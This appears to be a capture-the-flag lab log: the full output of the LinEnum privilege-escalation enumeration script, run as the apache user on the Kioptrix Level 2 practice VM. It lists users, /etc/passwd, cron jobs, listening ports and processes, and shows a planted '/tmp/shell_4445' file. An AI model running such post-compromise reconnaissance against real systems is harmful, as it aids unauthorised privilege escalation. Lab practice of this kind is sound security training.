@@ -1,0 +1,1898 @@
+bash-3.00$ ./LinEnum.sh -t
+./LinEnum.sh -t
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.98
+
+[-] Debug Info
+[+] Thorough tests = Enabled
+
+
+Scan started at:
+Sun Jan 26 02:21:59 EST 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007
+
+
+[-] Specific release information:
+CentOS release 4.5 (Final)
+
+
+[-] Hostname:
+kioptrix.level2
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+
+[-] Who else is logged on:
+ 02:21:59 up  3:42,  0 users,  load average: 0.00, 0.00, 0.07
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+uid=1(bin) gid=1(bin) groups=1(bin),2(daemon),3(sys)
+uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),4(adm),7(lp)
+uid=3(adm) gid=4(adm) groups=4(adm),3(sys)
+uid=4(lp) gid=7(lp) groups=7(lp)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=9(news) gid=13(news) groups=13(news)
+uid=10(uucp) gid=14(uucp) groups=14(uucp)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=12(games) gid=100(users) groups=100(users)
+uid=13(gopher) gid=30(gopher) groups=30(gopher)
+uid=14(ftp) gid=50(ftp) groups=50(ftp)
+uid=99(nobody) gid=99(nobody) groups=99(nobody)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=69(vcsa) gid=69(vcsa) groups=69(vcsa)
+uid=37(rpm) gid=37(rpm) groups=37(rpm)
+uid=68(haldaemon) gid=68(haldaemon) groups=68(haldaemon)
+uid=34(netdump) gid=34(netdump) groups=34(netdump)
+uid=28(nscd) gid=28(nscd) groups=28(nscd)
+uid=74(sshd) gid=74(sshd) groups=74(sshd)
+uid=32(rpc) gid=32(rpc) groups=32(rpc)
+uid=47(mailnull) gid=47(mailnull) groups=47(mailnull)
+uid=51(smmsp) gid=51(smmsp) groups=51(smmsp)
+uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
+uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)
+uid=77(pcap) gid=77(pcap) groups=77(pcap)
+uid=48(apache) gid=48(apache) groups=48(apache)
+uid=23(squid) gid=23(squid) groups=23(squid)
+uid=67(webalizer) gid=67(webalizer) groups=67(webalizer)
+uid=43(xfs) gid=43(xfs) groups=43(xfs)
+uid=38(ntp) gid=38(ntp) groups=38(ntp)
+uid=66(pegasus) gid=65(pegasus) groups=65(pegasus)
+uid=27(mysql) gid=27(mysql) groups=27(mysql)
+uid=500(john) gid=500(john) groups=500(john)
+uid=501(harold) gid=501(harold) groups=501(harold)
+
+
+[-] It looks like we have some admin users:
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),4(adm),7(lp)
+uid=3(adm) gid=4(adm) groups=4(adm),3(sys)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+rpm:x:37:37::/var/lib/rpm:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+squid:x:23:23::/var/spool/squid:/sbin/nologin
+webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+john:x:500:500::/home/john:/bin/bash
+harold:x:501:501::/home/harold:/bin/bash
+
+
+[-] Super user account(s):
+root
+
+
+[-] Are permissions on /home directories lax:
+total 24K
+drwxr-xr-x   4 root   root   4.0K Oct 12  2009 .
+drwxr-xr-x  23 root   root   4.0K Jan 25 22:39 ..
+drwx------   2 harold harold 4.0K Oct 12  2009 harold
+drwx------   2 john   john   4.0K Oct  8  2009 john
+
+
+[-] Files owned by our user:
+-rwxr-xr-x  1 apache apache 46108 Jan 26  2020 /tmp/LinEnum.sh
+-rwxr-xr-x  1 apache apache 152 Jan 26  2020 /tmp/shell_4445
+
+
+[-] Hidden files:
+-rw-r--r--  1 root root 212992 Jan 25 22:40 /dev/.udev.tdb
+-rw-r--r--  1 root root 0 Jan 25 22:39 /.autofsck
+-rw-r--r--  1 root root 0 Oct  8  2009 /var/cache/yum/.gpgkeyschecked.yum
+-rwxr-xr-x  1 root root 125 Feb 21  2005 /usr/share/emacs/site-lisp/emacspeak/servers/.servers
+-rw-r--r--  1 root root 7 Jul  9  2003 /usr/share/doc/freetype-2.1.9/docs/reference/.cvsignore
+-rw-r--r--  1 root root 40 Aug 13  2006 /usr/share/man/man1/..1.gz
+-rw-r--r--  1 root root 0 Jun  1  2009 /usr/share/pear/.lock
+-rw-r--r--  1 root root 2947 Jun  1  2009 /usr/share/pear/.depdb
+-rw-r--r--  1 root root 0 Jun  1  2009 /usr/share/pear/.depdblock
+-rw-r--r--  1 root root 7588 Jun  1  2009 /usr/share/pear/.filemap
+-rw-r--r--  1 root root 78 May  6  2007 /usr/share/comps/i386/.discinfo
+-rw-r--r--  1 root root 776 May  3  2007 /usr/kerberos/man/man5/.k5login.5.gz
+-rw-r--r--  1 root root 106637 Aug 12  2006 /usr/lib/perl5/5.8.5/i386-linux-thread-multi/.packlist
+-rw-r--r--  1 root root 72474 Feb 21  2005 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/auto/mod_perl/.packlist
+-rw-r--r--  1 root root 50428 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/.config
+-rw-r--r--  3 root root 1573 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/.pnmtologo.cmd
+-rw-r--r--  3 root root 1579 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/genksyms/.genksyms.o.cmd
+-rw-r--r--  3 root root 145 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/genksyms/.genksyms.cmd
+-rw-r--r--  3 root root 1024 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/genksyms/.parse.o.cmd
+-rw-r--r--  3 root root 1919 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/genksyms/.lex.o.cmd
+-rw-r--r--  3 root root 130 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/kconfig/.conf.cmd
+-rw-r--r--  3 root root 113 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/kconfig/.libkconfig.so.cmd
+-rw-r--r--  3 root root 1738 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/kconfig/.conf.o.cmd
+-rw-r--r--  3 root root 2876 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/kconfig/.mconf.o.cmd
+-rw-r--r--  3 root root 2411 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/kconfig/.zconf.tab.o.cmd
+-rw-r--r--  3 root root 1385 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/.conmakehash.cmd
+-rw-r--r--  3 root root 1860 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/mod/.modpost.o.cmd
+-rw-r--r--  3 root root 1426 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/mod/.mk_elfconfig.cmd
+-rw-r--r--  3 root root 2487 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/mod/.sumversion.o.cmd
+-rw-r--r--  1 root root 672 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/mod/.empty.o.cmd
+-rw-r--r--  3 root root 109 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/mod/.elfconfig.h.cmd
+-rw-r--r--  3 root root 1820 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/mod/.file2alias.o.cmd
+-rw-r--r--  3 root root 129 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/mod/.modpost.cmd
+-rw-r--r--  3 root root 1330 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/.kallsyms.cmd
+-rw-r--r--  3 root root 1811 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/basic/.split-include.cmd
+-rw-r--r--  3 root root 2196 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/basic/.docproc.cmd
+-rw-r--r--  3 root root 2496 May  2  2007 /usr/src/kernels/2.6.9-55.EL-i686/scripts/basic/.fixdep.cmd
+-rw-r--r--  1 root root 50002 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/.config
+-rw-r--r--  3 root root 1573 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/.pnmtologo.cmd
+-rw-r--r--  3 root root 1579 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/genksyms/.genksyms.o.cmd
+-rw-r--r--  3 root root 145 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/genksyms/.genksyms.cmd
+-rw-r--r--  3 root root 1024 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/genksyms/.parse.o.cmd
+-rw-r--r--  3 root root 1919 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/genksyms/.lex.o.cmd
+-rw-r--r--  3 root root 130 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/kconfig/.conf.cmd
+-rw-r--r--  3 root root 113 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/kconfig/.libkconfig.so.cmd
+-rw-r--r--  3 root root 1738 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/kconfig/.conf.o.cmd
+-rw-r--r--  3 root root 2876 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/kconfig/.mconf.o.cmd
+-rw-r--r--  3 root root 2411 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/kconfig/.zconf.tab.o.cmd
+-rw-r--r--  3 root root 1385 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/.conmakehash.cmd
+-rw-r--r--  3 root root 1860 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/mod/.modpost.o.cmd
+-rw-r--r--  3 root root 1426 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/mod/.mk_elfconfig.cmd
+-rw-r--r--  3 root root 2487 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/mod/.sumversion.o.cmd
+-rw-r--r--  2 root root 704 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/mod/.empty.o.cmd
+-rw-r--r--  3 root root 109 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/mod/.elfconfig.h.cmd
+-rw-r--r--  3 root root 1820 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/mod/.file2alias.o.cmd
+-rw-r--r--  3 root root 129 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/mod/.modpost.cmd
+-rw-r--r--  3 root root 1330 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/.kallsyms.cmd
+-rw-r--r--  3 root root 1811 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/basic/.split-include.cmd
+-rw-r--r--  3 root root 2196 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/basic/.docproc.cmd
+-rw-r--r--  3 root root 2496 May  2  2007 /usr/src/kernels/2.6.9-55.EL-hugemem-i686/scripts/basic/.fixdep.cmd
+-rw-r--r--  1 root root 50053 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/.config
+-rw-r--r--  3 root root 1573 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/.pnmtologo.cmd
+-rw-r--r--  3 root root 1579 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/genksyms/.genksyms.o.cmd
+-rw-r--r--  3 root root 145 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/genksyms/.genksyms.cmd
+-rw-r--r--  3 root root 1024 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/genksyms/.parse.o.cmd
+-rw-r--r--  3 root root 1919 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/genksyms/.lex.o.cmd
+-rw-r--r--  3 root root 130 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/kconfig/.conf.cmd
+-rw-r--r--  3 root root 113 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/kconfig/.libkconfig.so.cmd
+-rw-r--r--  3 root root 1738 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/kconfig/.conf.o.cmd
+-rw-r--r--  3 root root 2876 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/kconfig/.mconf.o.cmd
+-rw-r--r--  3 root root 2411 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/kconfig/.zconf.tab.o.cmd
+-rw-r--r--  3 root root 1385 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/.conmakehash.cmd
+-rw-r--r--  3 root root 1860 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/mod/.modpost.o.cmd
+-rw-r--r--  3 root root 1426 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/mod/.mk_elfconfig.cmd
+-rw-r--r--  3 root root 2487 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/mod/.sumversion.o.cmd
+-rw-r--r--  2 root root 704 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/mod/.empty.o.cmd
+-rw-r--r--  3 root root 109 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/mod/.elfconfig.h.cmd
+-rw-r--r--  3 root root 1820 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/mod/.file2alias.o.cmd
+-rw-r--r--  3 root root 129 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/mod/.modpost.cmd
+-rw-r--r--  3 root root 1330 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/.kallsyms.cmd
+-rw-r--r--  3 root root 1811 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/basic/.split-include.cmd
+-rw-r--r--  3 root root 2196 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/basic/.docproc.cmd
+-rw-r--r--  3 root root 2496 May  2  2007 /usr/src/kernels/2.6.9-55.EL-smp-i686/scripts/basic/.fixdep.cmd
+-rw-r--r--  1 root root 124 Aug 13  2006 /etc/skel/.bashrc
+-rw-r--r--  1 root root 191 Aug 13  2006 /etc/skel/.bash_profile
+-rw-r--r--  1 root root 383 Aug 13  2006 /etc/skel/.emacs
+-rw-r--r--  1 root root 658 May  4  2007 /etc/skel/.zshrc
+-rw-r--r--  1 root root 24 Aug 13  2006 /etc/skel/.bash_logout
+-rw-------  1 root root 0 Oct  7  2009 /etc/.pwd.lock
+-rw-------  1 root root 785 Jan 25 22:39 /etc/lvm/.cache
+
+
+[-] Home directory contents:
+total 64K
+drwxr-xr-x   8 root      root 4.0K Oct  7  2009 .
+drwxr-xr-x  21 root      root 4.0K Oct  7  2009 ..
+drwxr-xr-x   2 root      root 4.0K May  4  2007 cgi-bin
+drwxr-xr-x   3 root      root 4.0K Oct  7  2009 error
+drwxr-xr-x   2 root      root 4.0K Oct  8  2009 html
+drwxr-xr-x   3 root      root 4.0K Oct  8  2009 icons
+drwxr-xr-x  13 root      root 4.0K Oct  7  2009 manual
+drwxr-xr-x   2 webalizer root 4.0K Oct  9  2009 usage
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+PWD=/tmp
+SHLVL=3
+_=/bin/env
+
+
+[-] Path information:
+/usr/local/bin:/bin:/usr/bin
+
+
+[-] Available shells:
+/bin/sh
+/bin/bash
+/sbin/nologin
+/bin/ash
+/bin/bsh
+/bin/ksh
+/usr/bin/ksh
+/usr/bin/pdksh
+/bin/tcsh
+/bin/csh
+/bin/zsh
+
+
+[-] Current umask value:
+u=rwx,g=rx,o=rx
+0022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+-rw-r--r--  1 root root    0 Oct  7  2009 /etc/cron.deny
+-rw-r--r--  1 root root  255 Feb 21  2005 /etc/crontab
+
+/etc/cron.d:
+total 24
+drwxr-xr-x   2 root root  4096 Jul 12  2006 .
+drwxr-xr-x  80 root root 12288 Jan 25 23:45 ..
+
+/etc/cron.daily:
+total 108
+drwxr-xr-x   2 root root  4096 Oct  7  2009 .
+drwxr-xr-x  80 root root 12288 Jan 25 23:45 ..
+lrwxrwxrwx   1 root root    28 Oct  7  2009 00-logwatch -> ../log.d/scripts/logwatch.pl
+-rwxr-xr-x   1 root root   418 Sep 14  2006 00-makewhatis.cron
+-rwxr-xr-x   1 root root   135 Feb 21  2005 00webalizer
+-rwxr-xr-x   1 root root   276 Feb 21  2005 0anacron
+-rw-r--r--   1 root root   797 Feb 21  2005 certwatch
+-rwxr-xr-x   1 root root   180 Oct 20  2006 logrotate
+-rwxr-xr-x   1 root root  2133 Dec  1  2004 prelink
+-rwxr-xr-x   1 root root   104 May  4  2007 rpm
+-rwxr-xr-x   1 root root   121 Aug 21  2005 slocate.cron
+-rwxr-xr-x   1 root root   286 Feb 21  2005 tmpwatch
+-rwxr-xr-x   1 root root   158 May  5  2007 yum.cron
+
+/etc/cron.hourly:
+total 24
+drwxr-xr-x   2 root root  4096 Feb 21  2005 .
+drwxr-xr-x  80 root root 12288 Jan 25 23:45 ..
+
+/etc/cron.monthly:
+total 32
+drwxr-xr-x   2 root root  4096 Oct  7  2009 .
+drwxr-xr-x  80 root root 12288 Jan 25 23:45 ..
+-rwxr-xr-x   1 root root   278 Feb 21  2005 0anacron
+
+/etc/cron.weekly:
+total 48
+drwxr-xr-x   2 root root  4096 Oct  7  2009 .
+drwxr-xr-x  80 root root 12288 Jan 25 23:45 ..
+-rwxr-xr-x   1 root root   414 Sep 14  2006 00-makewhatis.cron
+-rwxr-xr-x   1 root root   277 Feb 21  2005 0anacron
+-rwxr-xr-x   1 root root    90 May  5  2007 yum.cron
+
+
+[-] Crontab contents:
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+HOME=/
+
+# run-parts
+01 * * * * root run-parts /etc/cron.hourly
+02 4 * * * root run-parts /etc/cron.daily
+22 4 * * 0 root run-parts /etc/cron.weekly
+42 4 1 * * root run-parts /etc/cron.monthly
+
+
+[-] Anacron jobs and associated file permissions:
+-rw-r--r--  1 root root 329 Feb 21  2005 /etc/anacrontab
+# /etc/anacrontab: configuration file for anacron
+
+# See anacron(8) and anacrontab(5) for details.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+1	65	cron.daily		run-parts /etc/cron.daily
+7	70	cron.weekly		run-parts /etc/cron.weekly
+30	75	cron.monthly		run-parts /etc/cron.monthly
+
+
+[-] When were jobs last executed (/var/spool/anacron contents):
+total 28
+drwxr-xr-x   2 root root 4096 Oct  7  2009 .
+drwxr-xr-x  14 root root 4096 Oct  7  2009 ..
+-rw-------   1 root root    9 Jan 25 23:45 cron.daily
+-rw-------   1 root root    9 Jan 25 23:55 cron.monthly
+-rw-------   1 root root    9 Jan 25 23:55 cron.weekly
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+eth0      Link encap:Ethernet  HWaddr 00:0C:29:CC:2C:F5  
+          inet addr:192.168.92.139  Bcast:192.168.92.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fecc:2cf5/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:8406511 errors:62 dropped:213 overruns:0 frame:0
+          TX packets:7401134 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:807907078 (770.4 MiB)  TX bytes:1284973879 (1.1 GiB)
+          Interrupt:177 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:2650 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2650 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:197878 (193.2 KiB)  TX bytes:197878 (193.2 KiB)
+
+sit0      Link encap:IPv6-in-IPv4  
+          NOARP  MTU:1480  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
+
+
+[-] Nameserver(s):
+nameserver 192.168.92.2
+
+
+[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
+tcp        0      0 0.0.0.0:641                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:631                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 :::80                       :::*                        LISTEN      11028/sh            
+tcp        0      0 :::22                       :::*                        LISTEN      -                   
+tcp        0      0 :::443                      :::*                        LISTEN      11028/sh            
+
+
+[-] Listening UDP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
+udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -                   
+udp        0      0 0.0.0.0:111                 0.0.0.0:*                               -                   
+udp        0      0 0.0.0.0:631                 0.0.0.0:*                               -                   
+udp        0      0 0.0.0.0:635                 0.0.0.0:*                               -                   
+udp        0      0 0.0.0.0:638                 0.0.0.0:*                               -                   
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.3  2040  392 ?        S    Jan25   0:01 init [3]                                   
+root         2  0.0  0.0     0    0 ?        SN   Jan25   0:00 [ksoftirqd/0]
+root         3  0.0  0.0     0    0 ?        S<   Jan25   0:00 [events/0]
+root         4  0.0  0.0     0    0 ?        S<   Jan25   0:00 [khelper]
+root         5  0.0  0.0     0    0 ?        S<   Jan25   0:00 [kacpid]
+root        82  0.0  0.0     0    0 ?        S<   Jan25   0:00 [kblockd/0]
+root        83  0.0  0.0     0    0 ?        S    Jan25   0:00 [khubd]
+root       100  0.0  0.0     0    0 ?        S    Jan25   0:00 [pdflush]
+root       101  0.0  0.0     0    0 ?        S    Jan25   0:00 [pdflush]
+root       102  0.0  0.0     0    0 ?        S    Jan25   0:01 [kswapd0]
+root       103  0.0  0.0     0    0 ?        S<   Jan25   0:00 [aio/0]
+root       249  0.0  0.0     0    0 ?        S    Jan25   0:00 [kseriod]
+root       482  0.0  0.0     0    0 ?        S<   Jan25   0:00 [ata/0]
+root       483  0.0  0.0     0    0 ?        S<   Jan25   0:00 [ata_aux]
+root       498  0.0  0.0     0    0 ?        S    Jan25   0:00 [kjournald]
+root      1715  0.0  0.2  3328  276 ?        S<s  Jan25   0:00 udevd
+root      1755  0.0  0.0     0    0 ?        S    Jan25   0:00 [shpchpd_event]
+root      1832  0.0  0.0     0    0 ?        S<   Jan25   0:00 [kauditd]
+root      1943  0.0  0.0     0    0 ?        S    Jan25   0:00 [kjournald]
+root      2529  0.0  0.3  1700  452 ?        Ss   Jan25   0:00 syslogd -m 0
+root      2533  0.0  0.2  1512  368 ?        Ss   Jan25   0:00 klogd -x
+rpc       2560  0.0  0.3  2320  384 ?        Ss   Jan25   0:00 portmap
+rpcuser   2579  0.0  0.3  3140  476 ?        Ss   Jan25   0:00 rpc.statd
+root      2605  0.0  0.1  6004  172 ?        Ss   Jan25   0:00 rpc.idmapd
+root      2677  0.0  0.2  1840  276 ?        Ss   Jan25   0:00 /usr/sbin/acpid
+root      2738  0.0  0.6  5124  788 ?        Ss   Jan25   0:00 /usr/sbin/sshd
+root      2774  0.0  0.3  3512  448 ?        Ss   Jan25   0:00 xinetd -stayalive -pidfile /var/run/xinetd.pid
+root      2792  0.0  0.7  9072  928 ?        Ss   Jan25   0:00 sendmail: accepting connections
+smmsp     2801  0.0  0.6  8040  844 ?        Ss   Jan25   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
+root      2811  0.0  0.1  2960  216 ?        Ss   Jan25   0:00 gpm -m /dev/input/mice -t imps2
+root      2821  0.0  0.3  5232  484 ?        Ss   Jan25   0:00 crond
+xfs       2843  0.0  0.4  4824  504 ?        Ss   Jan25   0:00 xfs -droppriv -daemon
+root      2860  0.0  0.2  3232  328 ?        Ss   Jan25   0:00 /usr/sbin/atd
+dbus      2869  0.0  0.2  3180  292 ?        Ss   Jan25   0:00 dbus-daemon-1 --system
+root      2878  0.0  1.2  8376 1536 ?        Ss   Jan25   0:00 hald
+root      3133  0.0  0.4  3556  504 ?        Ss   Jan25   0:00 dhclient
+root      3135  0.0  4.6 22376 5844 ?        Ss   Jan25   0:00 httpd
+root      3161  0.0  0.3  5680  440 ?        S    Jan25   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --err-log=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid
+mysql     3203  0.0  2.2 126884 2872 ?       Sl   Jan25   0:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock
+root      3233  0.0  0.2  3324  264 tty1     Ss+  Jan25   0:00 /sbin/mingetty tty1
+root      3234  0.0  0.2  1952  264 tty2     Ss+  Jan25   0:00 /sbin/mingetty tty2
+root      3235  0.0  0.2  2212  264 tty3     Ss+  Jan25   0:00 /sbin/mingetty tty3
+root      3236  0.0  0.2  1744  264 tty4     Ss+  Jan25   0:00 /sbin/mingetty tty4
+root      3237  0.0  0.2  1492  264 tty5     Ss+  Jan25   0:00 /sbin/mingetty tty5
+root      3238  0.0  0.2  3312  264 tty6     Ss+  Jan25   0:00 /sbin/mingetty tty6
+root      4131  0.0  0.9  9456 1168 ?        SNs  Jan25   0:01 cupsd
+apache   10635  0.0  4.9 22508 6284 ?        S    00:49   0:00 httpd
